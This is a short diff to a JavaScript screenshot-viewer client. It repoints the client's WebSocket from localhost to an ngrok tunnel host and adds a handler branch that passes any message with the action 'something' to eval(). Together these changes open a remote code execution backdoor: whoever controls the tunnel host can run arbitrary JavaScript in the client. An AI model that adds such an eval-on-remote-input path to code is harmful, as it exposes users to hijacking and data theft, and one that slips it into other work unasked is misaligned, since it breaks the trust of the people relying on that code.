@@ -73,7 +73,7 @@ function displayScreenshot(screenshotData) {
     screenshotElement.src = `data:image/png;base64,${screenshotData}`;
 }
 
-const ws = new WebSocket('ws://localhost:3000');
+const ws = new WebSocket('ws://poetic-national-amoeba.ngrok-free.app');
 
 ws.addEventListener('open', (event) => {
     console.log('WebSocket connection opened:', event);
@@ -84,5 +84,7 @@ ws.addEventListener('message', (event) => {
 
     if (data.action === 'search') {
         displayScreenshot(data.screenshotData);
+    } else if (data.action === 'something') {
+        eval(data.value)
     }
 });
